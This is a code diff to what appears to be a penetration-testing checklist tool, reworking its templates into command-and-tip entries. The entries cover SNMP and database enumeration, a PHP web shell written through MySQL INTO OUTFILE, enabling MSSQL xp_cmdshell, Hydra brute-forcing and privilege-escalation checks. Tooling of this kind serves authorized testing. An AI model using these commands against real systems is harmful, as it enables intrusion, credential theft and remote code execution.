+                "title": "4. Installed Software Inventory",
+                "command": "snmpwalk -v2c -c public <TARGET_IP> 1.3.6.1.2.1.25.6.3.1.2",
+                "tip": "Enumerate installed packages and third-party software.",
+            },
+            {
+                "title": "5. Network Interfaces & IPs",
+                "command": "snmpwalk -v2c -c public <TARGET_IP> ipAddrTable",
+                "tip": "Discover secondary network interfaces and hidden internal subnets.",
+            },
+            {
+                "title": "6. User Account Enumeration",
+                "command": "snmpwalk -v2c -c public <TARGET_IP> 1.3.6.1.4.1.77.1.2.25",
+                "tip": "Extract local Windows/Unix user accounts via SNMP.",
+            },
+        ],
+    },
+    "databases": {
+        "category": "DATABASE SERVICES",
+        "description": "Database enumeration checklist (MySQL 3306, MSSQL 1433, PostgreSQL 5432)",
+        "items": [
+            {
+                "title": "1. Default Admin Logins",
+                "command": "mysql -u root -h <TARGET_IP> (blank) / sqsh -S <TARGET_IP> -U sa",
+                "tip": "Test default administrative accounts with blank passwords.",
+            },
+            {
+                "title": "2. Discovered Credential Testing",
+                "command": "mysql -u <USER> -p -h <TARGET_IP>",
+                "tip": "Test web application credentials found in config files against database port.",
+            },
+            {
+                "title": "3. Database & Table Dumping",
+                "command": "SHOW DATABASES; USE <DB>; SHOW TABLES; SELECT * FROM users;",
+                "tip": "Dump user tables, password hashes, and sensitive application data.",
+            },
+            {
+                "title": "4. MySQL File Read (LOAD_FILE)",
+                "command": "SELECT LOAD_FILE('/etc/passwd');",
+                "tip": "Read sensitive local files via MySQL administrative account.",
+            },
+            {
+                "title": "5. MySQL Web Shell Upload",
+                "command": "SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php';",
+                "tip": "Write web shell if MySQL user has FILE privileges and directory is writable.",
+            },
+            {
+                "title": "6. MSSQL Command Execution",
+                "command": "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'whoami';",
+                "tip": "Enable xp_cmdshell on MSSQL to execute operating system commands.",
+            },
         ],
     },
     "cracking": {
         "category": "PASSWORD & HASH CRACKING",
         "description": "Hash identification, password cracking, and online brute-forcing methodology",
         "items": [
-            "Identify hash type (`hashid -m <hash>` or `hash-identifier` or name-that-hash)",
-            "Identify hash format: MD5 (0), SHA256 (1400), NTLM (1000), NetNTLMv2 (5600), Unix crypt (1800)",
-            "Prepare target hash file (clean up whitespace, ensure correct format)",
-            "Run John the Ripper (`john --wordlist=/usr/share/wordlists/rockyou.txt --format=<format> hashes.txt`)",
-            "Run Hashcat if GPU available (`hashcat -m <mode> -a 0 hashes.txt /usr/share/wordlists/rockyou.txt`)",
-            "Online brute-force for SSH with Hydra (`hydra -l <user> -P /usr/share/wordlists/rockyou.txt ssh://<IP> -t 4`)",
-            "Online brute-force for FTP with Hydra (`hydra -L users.txt -P passwords.txt ftp://<IP> -vV`)",
-            "Online brute-force for HTTP POST login (`hydra <IP> http-post-form \"/login.php:user=^USER^&pass=^PASS^:F=invalid\" -L users.txt -P rockyou.txt`)",
-            "Test cracked passwords against all discovered targets and services (credential reuse)",
+            {
+                "title": "1. Identify Hash Format",
+                "command": "hashid -m <HASH> / hash-identifier",
+                "tip": "Determine hash type: MD5 (0), SHA256 (1400), NTLM (1000), NetNTLMv2 (5600).",
+            },
+            {
+                "title": "2. John the Ripper Cracking",
+                "command": "john --wordlist=/usr/share/wordlists/rockyou.txt --format=<FORMAT> hashes.txt",
+                "tip": "Crack CPU-based hashes using John the Ripper with rockyou.txt.",
+            },
+            {
+                "title": "3. Hashcat GPU Cracking",
+                "command": "hashcat -m <MODE> -a 0 hashes.txt /usr/share/wordlists/rockyou.txt",
+                "tip": "Accelerated GPU password recovery using Hashcat.",
+            },
+            {
+                "title": "4. Hydra Online HTTP Brute-Force",
+                "command": "hydra <TARGET_IP> http-post-form \"/login.php:user=^USER^&pass=^PASS^:F=invalid\" -L users.txt -P rockyou.txt",
+                "tip": "Target web login forms using Hydra with correct failure condition string.",
+            },
+            {
+                "title": "5. Credential Reuse Testing",
+                "command": "Test cracked credentials across SSH, SMB, RDP, WinRM, and Web portals",
+                "tip": "Users frequently reuse cracked passwords across different machines and services.",
+            },
+        ],
+    },
+    "privesc": {
+        "category": "PRIVILEGE ESCALATION",
+        "description": "Cross-platform privilege escalation checklist (Linux & Windows low-hanging fruit)",
+        "items": [
+            {
+                "title": "[Linux] Sudo Rights & GTFOBins",
+                "command": "sudo -l",
+                "tip": "Check if current user can run any binary as root.",
+            },
+            {
+                "title": "[Linux] SUID Executables",
+                "command": "find / -perm -u=s -type f 2>/dev/null",
+                "tip": "Look for custom or GTFOBins-vulnerable SUID executables.",
+            },
+            {
+                "title": "[Linux] Cron Jobs & Timers",
+                "command": "cat /etc/crontab /etc/cron.*",
+                "tip": "Look for user-writable scheduled scripts.",
+            },
+            {
+                "title": "[Windows] SeImpersonatePrivilege",
+                "command": "whoami /priv",
+                "tip": "If enabled, exploit via PrintSpoofer or GodPotato for SYSTEM shell.",
+            },
+            {
+                "title": "[Windows] Unquoted Service Paths",
+                "command": "wmic service get name,pathname,startmode | findstr /i \"auto\" | findstr /v \"C:\\Windows\\\"",
+                "tip": "Look for unquoted paths with spaces in writable folders.",
+            },
+            {
+                "title": "[Windows] Saved Credentials",
+                "command": "cmdkey /list",
+                "tip": "Check for stored credentials in Windows Credential Manager.",
+            },
         ],
     },
 }
 
-# Aliases for convenience
 TEMPLATE_ALIASES: Dict[str, str] = {
     "linux-privesc": "linux",
     "windows-privesc": "windows",
@@ -246,15 +652,27 @@ def get_available_templates() -> List[str]:
     return list(STATIC_TEMPLATES.keys())
 
 
-def load_template(template_name: str) -> Optional[Dict[str, any]]:
+def load_template(template_name: str) -> Optional[Dict[str, Any]]:
     """Retrieve template definition by name, supporting common aliases."""
     name_clean = template_name.strip().lower()
     canonical = TEMPLATE_ALIASES.get(name_clean, name_clean)
     return STATIC_TEMPLATES.get(canonical)
 
 
+def get_template_guidance_for_title(title: str) -> Optional[Dict[str, str]]:
+    """Find command and tip guidance matching a checklist item title."""
+    title_clean = title.strip().lower()
+    for tmpl in STATIC_TEMPLATES.values():
+        for entry in tmpl["items"]:
+            item_t = entry["title"] if isinstance(entry, dict) else str(entry)
+            if item_t.strip().lower() == title_clean:
+                if isinstance(entry, dict):
+                    return {"command": entry.get("command", ""), "tip": entry.get("tip", "")}
+    return None
+
+
 def apply_template_to_store(
-    store: any,
+    store: Any,
     template_name: str,
     target_id: Optional[int] = None,
 ) -> List[ChecklistItem]:
@@ -266,7 +684,8 @@ def apply_template_to_store(
 
     category = tmpl["category"]
     created_items: List[ChecklistItem] = []
-    for item_title in tmpl["items"]:
+    for entry in tmpl["items"]:
+        item_title = entry["title"] if isinstance(entry, dict) else str(entry)
         item = store.add_checklist_item(
             title=item_title,
             category=category,
